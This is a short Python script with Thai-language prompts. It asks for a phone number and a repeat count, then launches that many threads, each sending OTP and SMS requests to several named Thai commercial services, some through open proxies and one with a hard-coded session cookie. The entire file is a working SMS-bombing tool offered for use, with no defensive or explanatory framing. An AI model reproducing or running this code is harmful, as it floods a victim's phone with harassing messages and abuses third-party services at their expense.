import requests, threading
phonenumber = input("เบอร์โทรศัพท์นะจ๊ะ ->")
number = int(input("ยิงเท่าไหร่ว่ามา ->"))
def attack():
    requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phonenumber},proxies={"http": "http://182.52.103.144:8080"})
    requests.post("https://api.1112delivery.com/api/v1/otp/create", data = {"phonenumber":""+phonenumber+"","language":"th"}, headers = {})
    requests.post("https://www.kaitorasap.co.th/api/index.php/send-otp/", data="phone_number="+phonenumber+"&lag=", headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Cookie": "PHPSESSID=f5nrukmps3fa5gk25eh4v0tgg0; _ga=GA1.3.1240095898.1635597163; _gid=GA1.3.747741928.1635597163; _gat_gtag_UA_141105037_1=1"},proxies = {"http": "http://185.104.252.10:9090"})
    requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", data = {"tel":phonenumber,"otp_type":"register"}, headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"}, proxies = {"http": "http://182.52.103.144:8080"})
for i in range(number):
	threading.Thread(target=attack).start()